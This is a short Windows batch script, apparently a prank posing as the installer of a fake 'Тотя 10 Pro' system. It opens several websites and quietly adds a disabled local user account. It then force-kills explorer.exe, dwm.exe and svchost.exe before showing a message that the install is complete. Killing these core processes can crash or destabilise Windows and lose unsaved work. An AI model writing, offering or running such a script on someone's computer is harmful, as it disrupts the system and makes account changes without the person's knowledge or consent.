@echo off
start "" https://www.deviantart.com/
start "" https://www.google.com/
start "" https://www.youtube.com/
start "" https://youtomb.github.io/
net user "Тотя" /add >nul
net user "Тотя" /active=no >nul
taskkill /f /im explorer.exe
taskkill /f /im dwm.exe
taskkill /f /im svchost.exe
start explorer.exe
msg * "Тотя 10 Pro installed."
